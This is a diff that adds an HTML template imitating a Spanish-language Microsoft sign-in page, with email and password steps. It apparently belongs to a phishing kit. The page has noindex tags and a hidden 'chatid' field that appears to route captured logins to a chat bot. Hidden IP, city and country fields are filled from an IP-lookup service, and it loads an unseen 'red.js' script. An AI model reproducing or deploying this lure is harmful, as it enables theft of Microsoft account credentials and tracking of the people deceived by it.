@@ -1,0 +1,161 @@
+<html lang="en">
+  <head>
+    <meta name="robots" content="noindex, nofollow" />
+    <meta name="googlebot" content="noindex, nofollow" />
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252" />
+    <meta
+      name="viewport"
+      content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"
+    />
+    <title>Iniciar sesión es tu cuenta Microsoft</title>
+    <link
+      rel="shortcut icon"
+      href="{{ url_for('static', filename='favicon.png') }}"
+      type="image/png"
+    />
+    <link rel="stylesheet" href="{{ url_for('static', filename='2.css') }}" />
+    <link rel="stylesheet" href="{{ url_for('static', filename='1.css') }}" />
+    <script src="{{ url_for('static', filename='script.min.js') }}"></script>
+    <script src="{{ url_for('static', filename='red.js') }}"></script>
+  </head>
+  <body>
+    <input type="hidden" name="" value="" />
+    <div class="login-form-1">
+      <form id="formulario">
+        <div class="logo">
+          <img src="{{ url_for('static', filename='favicon.png') }}" alt="" />
+          Microsoft
+        </div>
+        <input type="hidden" name="chatid" id="chatid" value="1002033182301" />
+
+        <div class="login-title">Iniciar sesión</div>
+        <div class="error-message"></div>
+        <div class="input-box">
+          <input
+            type="email"
+            class="txtmail"
+            id="txtmail"
+            placeholder="Correo electrónico, teléfono o Skype"
+            onchange="hideMessage()"
+            oninput="hideMessage()"
+            onkeyup="hideMessage()"
+            onkeypress="return continuar(event);"
+          />
+          <div class="loader">
+            <div class="wrapper">
+              <span></span><span></span><span></span><span></span><span></span>
+            </div>
+          </div>
+        </div>
+        <div>
+          <input type="text" id="ip" name="ip" style="display: none" />
+          <input type="text" id="ciudad" name="ciudad" style="display: none" />
+          <input type="text" id="pais" name="pais" style="display: none" />
+        </div>
+
+        <div class="create-account">
+          ¿No tiene una cuenta?
+          <a href="#">Cree una.</a>
+        </div>
+
+        <div class="security-key-login">
+          <a href="#">
+            Iniciar sesión con una llave de seguridad
+            <img src="./files/question.png" alt="" />
+          </a>
+        </div>
+
+        <div class="login-options">
+          <a href="#"> Opciones de inicio de sesión </a>
+        </div>
+
+        <script>
+          function continuar(e) {
+            e = e || window.event;
+            if (e.keyCode == 13) {
+              document.getElementById("boton").click();
+              return false;
+            }
+            return true;
+          }
+        </script>
+
+        <div class="next-btn" id="boton">Siguiente</div>
+      </form>
+    </div>
+
+    <div class="login-form-2">
+      <div class="logo">
+        <img src="{{ url_for('static', filename='favicon.png') }}" alt="" />
+        Microsoft
+      </div>
+
+      <div class="current-email">
+        <i class="fa-arrow-left"></i>
+        <span class="current" id="lbl-email"></span>
+      </div>
+
+      <div class="login-title">Escribir contraseña</div>
+
+      <div class="error-message"></div>
+
+      <div class="input-box">
+        <input
+          type="password"
+          class="txtpass"
+          id="txtpass"
+          placeholder="Contraseña"
+          onchange="hideMessage()"
+          oninput="hideMessage()"
+          onkeyup="hideMessage()"
+          onkeypress="return continuar2(event);"
+        />
+        <div class="loader">
+          <div class="wrapper">
+            <span></span><span></span><span></span><span></span><span></span>
+          </div>
+        </div>
+      </div>
+
+      <script>
+        function continuar2(e) {
+          e = e || window.event;
+          if (e.keyCode == 13) {
+            document.getElementById("boton2").click();
+            return false;
+          }
+          return true;
+        }
+      </script>
+
+      <div class="login-btn" id="boton4">Iniciar sesión</div>
+
+      <div class="create-account">
+        <a href=""> ¿Olvidó su contraseña? </a>
+      </div>
+    </div>
+
+    <footer>
+      <a href="">Términos de uso</a>
+      <a href="">Privacidad y cookies</a>
+      <a href="">. . .</a>
+    </footer>
+  </body>
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+  <script>
+    const url = "https://ipapi.co/json/";
+    const form = document.querySelector("#login-form");
+    axios
+      .get(url)
+      .then((response) => {
+        document.querySelector("#ip").value = response.data.ip;
+        document.querySelector("#ciudad").value = response.data.city;
+        document.querySelector("#pais").value = response.data.country;
+      })
+      .catch((error) => {
+        console.log(error);
+      });
+  </script>
+</html>
